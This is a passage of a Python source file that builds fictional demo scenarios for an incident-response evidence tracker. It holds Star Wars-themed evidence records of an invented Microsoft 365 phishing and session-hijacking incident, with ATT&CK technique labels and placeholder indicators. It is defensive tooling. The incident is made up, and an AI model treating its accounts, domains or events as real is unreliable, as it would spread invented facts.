                "technique": "T1539 - Steal Web Session Cookie; T1098.005 - Account Manipulation: Device Registration; T1564.008 - Hide Artifacts: Email Hiding Rules",
                "log_link": "https://siem.internal.example/events/ual-new-inboxrule-66188",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Ahsoka Tano",
                "ts": datetime(2026, 10, 26, 11, 16, 0, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 26, 11, 29, 45, tzinfo=dt_timezone.utc),
                "asset": "EXO-MAILBOX-LCALRISSIAN",
                "user": "l.calrissian@corellia-eng.example",
                "attacker_user": False,
                "summary": "Automated Graph API script sent 486 internal and external phishing/spam messages from l.calrissian containing 'Q4 Tibanna & Hyperdrive Remittance Notice' link to sso-corellia-auth.net.",
                "notes": "142 internal employees and 344 external supply-chain contacts received the lure before outbound rate-limiting triggered.",
                "indicators": "198.51.100.42, sso-corellia-auth.net",
                "cmd": "POST https://graph.microsoft.com/v1.0/me/sendMail [486 messages dispatched]",
                "tactic": "Lateral Movement (TA0008); Initial Access (TA0001)",
                "technique": "T1534 - Internal Spearphishing; T1566.002 - Phishing: Spearphishing Link",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/exo-spam-burst-486",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(event.provider:Exchange%20AND%20sender:l.calrissian@corellia-eng.example)",
                "key": True,
                "shot": (
                    "corellia_spam_wave_telemetry.png",
                    "Exchange Message Trace: 486 Phishing Spam Emails Sent in 13 Minutes",
                    [
                        "[EXO] Sender=l.calrissian@corellia-eng.example | Subject='Q4 Hyperdrive Remittance'",
                        "11:16:04 - 11:29:45 UTC | Internal Recipients=142 | External Partner Recipients=344",
                        "Embedded Phishing URL: https://sso-corellia-auth.net/remittance/view",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_SEARCH,
                "analyst": "Leia Organa",
                "ts": datetime(2026, 10, 26, 11, 24, 10, tzinfo=dt_timezone.utc),
                "end_ts": datetime(2026, 10, 26, 11, 42, 5, tzinfo=dt_timezone.utc),
                "asset": "M365-TENANT-CORELLIA",
                "user": "w.antilles@corellia-eng.example, m.mothma@corellia-eng.example, h.solo@corellia-eng.example",
                "attacker_user": False,
                "summary": "Secondary multi-account takeover: w.antilles, m.mothma, and h.solo authenticated via internal spam link and had session tokens hijacked from 192.0.2.84.",
                "notes": "Attacker registered stealth inbox rules on all three compromised accounts and began secondary BEC thread hijacking from m.mothma.",
                "indicators": "203.0.113.195, 192.0.2.84, sso-corellia-auth.net",
                "cmd": "",
                "tactic": "Credential Access (TA0006); Lateral Movement (TA0008); Persistence (TA0003)",
                "technique": "T1539 - Steal Web Session Cookie; T1078.004 - Valid Accounts: Cloud Accounts",
                "log_link": "",
                "res_link": "https://siem.internal.example/app/discover#/view/corellia-multi-ato",
                "qry_link": "https://siem.internal.example/app/discover#/?_q=(source.ip:(203.0.113.195%20OR%20192.0.2.84)%20AND%20outcome:success)",
                "key": True,
                "shot": (
                    "corellia_multi_account_takeover.png",
                    "Cloud Identity Correlation: 4 Compromised Accounts via MitM Proxy",
                    [
                        "[SIEM] Compromised Cloud Accounts (Session Replay Confirmed):",
                        "1) l.calrissian@corellia-eng.example | Replay IP: 198.51.100.42",
                        "2) w.antilles@corellia-eng.example   | Replay IP: 192.0.2.84",
                        "3) m.mothma@corellia-eng.example     | Replay IP: 192.0.2.84",
                        "4) h.solo@corellia-eng.example       | Replay IP: 192.0.2.84",
                    ],
                ),
            },
            {
                "type": EvidenceItem.EVIDENCE_TYPE_ATOMIC,
                "analyst": "Cassian Andor",
                "ts": datetime(2026, 10, 26, 11, 47, 19, tzinfo=dt_timezone.utc),
                "end_ts": None,
                "asset": "SPO-HYPERDRIVE-PROCUREMENT",
                "user": "m.mothma@corellia-eng.example",
                "attacker_user": False,
                "summary": "FileDownloaded events in Unified Audit Log: 28 supplier wire-routing PDFs downloaded from SharePoint site SPO-HYPERDRIVE-PROCUREMENT via hijacked m.mothma session.",
                "notes": "SOC revoked refresh tokens across all 4 accounts at 11:51 UTC, deleted rogue MFA devices & inbox rules, and blocked sso-corellia-auth.net.",
                "indicators": "192.0.2.84",
                "cmd": "",
                "tactic": "Collection (TA0009); Exfiltration (TA0010)",
                "technique": "T1213.002 - Data from Information Repositories: SharePoint; T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage",
                "log_link": "https://siem.internal.example/events/ual-spo-download-66410",
                "res_link": "",
                "qry_link": "",
                "key": True,
                "shot": None,
            },
        ],
    }


SCENARIO_BUILDERS = {
    "expanse": _get_expanse_spec,
    "star_trek": _get_star_trek_spec,
    "matrix": _get_matrix_spec,
    "star_wars": _get_star_wars_spec,
}


def create_demo_scenario(scenario_key: str) -> list[Project]:
    """
    Creates one sample scenario (or all 4 when `scenario_key == 'all'`) and returns
    the created `Project` list. Raises `ValueError` if `scenario_key` is unknown.
    """
    key = (scenario_key or "expanse").strip().lower()
    if key == "all":
        return [_materialize_scenario(builder()) for builder in SCENARIO_BUILDERS.values()]
    if key not in SCENARIO_BUILDERS:
        valid = ", ".join(list(SCENARIO_BUILDERS.keys()) + ["all"])
        raise ValueError(f"Unknown sample scenario '{scenario_key}'. Choose one of: {valid}.")
    return [_materialize_scenario(SCENARIO_BUILDERS[key]())]
